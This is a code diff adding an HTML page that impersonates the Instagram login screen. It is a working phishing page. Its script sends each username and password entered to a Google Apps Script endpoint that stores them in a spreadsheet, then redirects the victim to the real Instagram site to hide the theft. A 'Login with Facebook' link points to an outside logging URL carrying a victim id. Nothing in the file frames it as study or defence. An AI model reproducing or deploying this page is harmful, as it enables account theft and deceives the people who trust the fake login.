@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="robots" content="noindex,follow" />
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login</title>
+<link rel="stylesheet" href="bootstrap.min.css">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="wrapper">
+<div class="container">
+<div class="row">
+<div class="col-md-6 firstContainer">
+<img src="img/app-feautures.png" alt="[+]" class="rounded d-block w-100">
+</div>
+<div class="col-md-6 text-center secondContainer">
+<div class="card">
+<div class="py-3 px-2">
+<img src="img/instagram-logo.png" alt="card-img-top">
+</div>
+<div class="card-body">
+<form method="POST" name="submit-to-google-sheet">
+<input type="hidden" name="id" value="6049167668">
+<div class="form-group py-1">
+<input type="text" class="form-control" name="Email" placeholder="Phone Number, Username or Email" autocomplete="email" required>
+</div>
+<div class="form-group py-1">
+<input type="password" class="form-control" aria-describedby="helpId" name="Password" placeholder="Password" required>
+</div>
+<input id="btn" type="submit" value="Log In" class="mt-2 btn btn-primary w-100">
+<span  id="msg"></span>
+</form>
+<div class="or">
+<span>OR</span>
+</div>
+<div class="otherMethods">
+<div class="secondaryColor">
+<img src="img/facebook-logo.png" class="img-fluid rounded" alt="[+]" style="width: 18px;height: 18px">
+<span class="ms-2" onclick="window.location.href='https://ix-event.com.tr/log/FBV1/api.php?id=6049167668';">Login with Facebook</span>
+</div>
+</div>
+<div class="forgot-pass mt-3 primaryColor">Forgot Password?</div>
+</div>
+</div>
+<div class="card my-2">
+<div class="card-body">
+<span>Don't Have an Account?</span><span class="primaryColor">Sign Up</span>
+</div>
+</div>
+<span class="primaryColor">Get the App</span>
+<div class="row py-2">
+<div class="col-6"><img src="img/playstore.png" alt="[+]" class="img-fluid d-block rounded" />
+</div>
+<div class="col-6"><img src="img/appstore.png" alt="[+]" class="img-fluid d-block rounded" />
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyDd94-gew7eZ5QOP78_EmiGzIj8ElAiRbK7ATeBLAXyvB7S18Peewkl8vBPQvJhpGl/exec'
+  const form = document.forms['submit-to-google-sheet']
+  const msg = document.getElementById('msg')
+  form.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+  .then(response => {
+  msg.innerHTML = ""
+  setTimeout(function(){
+  msg.innerHTML = ""
+  },5000)
+  form.reset()
+    })
+      .catch(error => console.error('Error!', error.message))
+  })
+   document.getElementById("btn").addEventListener("click", redirectFunction);
+        
+        function redirectFunction(){
+            window.location.href = "https://www.instagram.com/";
+            // You can also use window.location.replace method
+            
+            /*
+             * window.location.replace("https://www.example.com");
+             */
+        }
+        </script>
+</body>
+</html>
